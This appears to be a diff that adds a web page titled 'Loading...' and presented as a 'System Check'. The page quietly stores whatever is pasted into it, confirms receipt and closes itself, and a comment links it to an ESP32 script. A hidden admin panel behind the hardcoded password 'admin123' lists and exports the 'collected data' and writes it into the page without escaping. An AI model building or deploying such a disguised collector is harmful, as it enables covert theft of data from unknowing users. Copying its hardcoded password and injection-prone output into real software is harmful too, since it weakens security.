@@ -1,0 +1,241 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Loading...</title>
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    body {
+      font-family: Arial, sans-serif;
+      background: #f0f0f0;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+      padding: 20px;
+    }
+    .container {
+      background: white;
+      padding: 40px;
+      border-radius: 10px;
+      box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+      max-width: 500px;
+      width: 100%;
+    }
+    h2 {
+      margin-bottom: 20px;
+      color: #333;
+    }
+    textarea {
+      width: 100%;
+      min-height: 200px;
+      padding: 15px;
+      border: 2px solid #ddd;
+      border-radius: 5px;
+      font-family: 'Courier New', monospace;
+      font-size: 14px;
+      resize: vertical;
+    }
+    button {
+      width: 100%;
+      padding: 15px;
+      background: #4CAF50;
+      color: white;
+      border: none;
+      border-radius: 5px;
+      font-size: 16px;
+      cursor: pointer;
+      margin-top: 15px;
+      font-weight: bold;
+    }
+    button:hover {
+      background: #45a049;
+    }
+    .success {
+      background: #4CAF50;
+      color: white;
+      padding: 15px;
+      border-radius: 5px;
+      text-align: center;
+      margin-top: 15px;
+      display: none;
+    }
+    .admin-link {
+      text-align: center;
+      margin-top: 20px;
+      color: #666;
+      font-size: 12px;
+    }
+    .admin-link a {
+      color: #333;
+      text-decoration: none;
+    }
+  </style>
+</head>
+<body>
+  <div class="container" id="mainPage">
+    <h2>System Check</h2>
+    <textarea id="dataInput" placeholder="Paste data here..." autofocus></textarea>
+    <button onclick="submitData()">Submit</button>
+    <div class="success" id="successMsg">Data received successfully!</div>
+    <div class="admin-link">
+      <a href="#" onclick="showAdmin(); return false;">Admin Access</a>
+    </div>
+  </div>
+
+  <div class="container" id="adminLogin" style="display: none;">
+    <h2>Admin Login</h2>
+    <input type="password" id="adminPass" placeholder="Enter password" style="width: 100%; padding: 15px; border: 2px solid #ddd; border-radius: 5px; font-size: 14px; margin-bottom: 15px;">
+    <button onclick="checkPassword()">Login</button>
+    <button onclick="showMain()" style="background: #666; margin-top: 10px;">Back</button>
+  </div>
+
+  <div class="container" id="adminPanel" style="display: none;">
+    <h2>Admin Panel - Collected Data</h2>
+    <div style="max-height: 400px; overflow-y: auto; margin-bottom: 20px;">
+      <div id="dataList" style="font-family: 'Courier New', monospace; font-size: 12px; background: #f5f5f5; padding: 15px; border-radius: 5px;">
+        No data collected yet.
+      </div>
+    </div>
+    <button onclick="clearData()" style="background: #f44336;">Clear All Data</button>
+    <button onclick="exportData()" style="background: #2196F3; margin-top: 10px;">Export to File</button>
+    <button onclick="logout()" style="background: #666; margin-top: 10px;">Logout</button>
+  </div>
+
+  <script>
+    // CHANGE THIS PASSWORD!
+    const ADMIN_PASSWORD = "admin123";
+    
+    // Storage for collected data (using localStorage)
+    let collectedData = JSON.parse(localStorage.getItem('collectedData') || '[]');
+
+    function submitData() {
+      const data = document.getElementById('dataInput').value;
+      if(!data.trim()) {
+        alert('Please paste data first');
+        return;
+      }
+
+      // Save data with timestamp
+      const entry = {
+        timestamp: new Date().toISOString(),
+        data: data,
+        ip: 'Unknown' // In real deployment, server would capture this
+      };
+
+      collectedData.push(entry);
+      localStorage.setItem('collectedData', JSON.stringify(collectedData));
+
+      // Show success message
+      document.getElementById('successMsg').style.display = 'block';
+      document.getElementById('dataInput').value = '';
+
+      // Auto-close after 2 seconds (mimics the ESP32 script)
+      setTimeout(() => {
+        window.close();
+      }, 2000);
+    }
+
+    function showAdmin() {
+      document.getElementById('mainPage').style.display = 'none';
+      document.getElementById('adminLogin').style.display = 'block';
+      document.getElementById('adminPass').focus();
+    }
+
+    function showMain() {
+      document.getElementById('adminLogin').style.display = 'none';
+      document.getElementById('mainPage').style.display = 'block';
+    }
+
+    function checkPassword() {
+      const pass = document.getElementById('adminPass').value;
+      if(pass === ADMIN_PASSWORD) {
+        document.getElementById('adminLogin').style.display = 'none';
+        document.getElementById('adminPanel').style.display = 'block';
+        displayData();
+      } else {
+        alert('Incorrect password');
+        document.getElementById('adminPass').value = '';
+      }
+    }
+
+    function displayData() {
+      const list = document.getElementById('dataList');
+      
+      if(collectedData.length === 0) {
+        list.innerHTML = 'No data collected yet.';
+        return;
+      }
+
+      let html = '';
+      collectedData.forEach((entry, index) => {
+        const date = new Date(entry.timestamp);
+        html += `
+          <div style="background: white; padding: 10px; margin-bottom: 10px; border-left: 3px solid #4CAF50; border-radius: 3px;">
+            <strong>Entry #${index + 1}</strong> - ${date.toLocaleString()}<br>
+            <pre style="margin-top: 10px; white-space: pre-wrap; word-wrap: break-word;">${entry.data}</pre>
+          </div>
+        `;
+      });
+
+      list.innerHTML = html;
+    }
+
+    function clearData() {
+      if(confirm('Are you sure you want to delete all collected data?')) {
+        collectedData = [];
+        localStorage.setItem('collectedData', JSON.stringify(collectedData));
+        displayData();
+        alert('All data cleared');
+      }
+    }
+
+    function exportData() {
+      if(collectedData.length === 0) {
+        alert('No data to export');
+        return;
+      }
+
+      let exportText = 'COLLECTED DATA EXPORT\n';
+      exportText += '='.repeat(50) + '\n\n';
+
+      collectedData.forEach((entry, index) => {
+        const date = new Date(entry.timestamp);
+        exportText += `Entry #${index + 1}\n`;
+        exportText += `Timestamp: ${date.toLocaleString()}\n`;
+        exportText += `Data:\n${entry.data}\n`;
+        exportText += '-'.repeat(50) + '\n\n';
+      });
+
+      const blob = new Blob([exportText], { type: 'text/plain' });
+      const url = window.URL.createObjectURL(blob);
+      const a = document.createElement('a');
+      a.href = url;
+      a.download = 'collected_data_' + Date.now() + '.txt';
+      a.click();
+    }
+
+    function logout() {
+      document.getElementById('adminPanel').style.display = 'none';
+      document.getElementById('mainPage').style.display = 'block';
+      document.getElementById('adminPass').value = '';
+    }
+
+    // Auto-focus on text area when page loads
+    window.onload = function() {
+      document.getElementById('dataInput').focus();
+    }
+
+    // Allow Enter key in password field
+    document.addEventListener('DOMContentLoaded', function() {
+      const passField = document.getElementById('adminPass');
+      if(passField) {
+        passField.addEventListener('keypress', function(e) {
+          if(e.key === 'Enter') checkPassword();
+        });
+      }
+    });
+  </script>
+</body>
+</html>
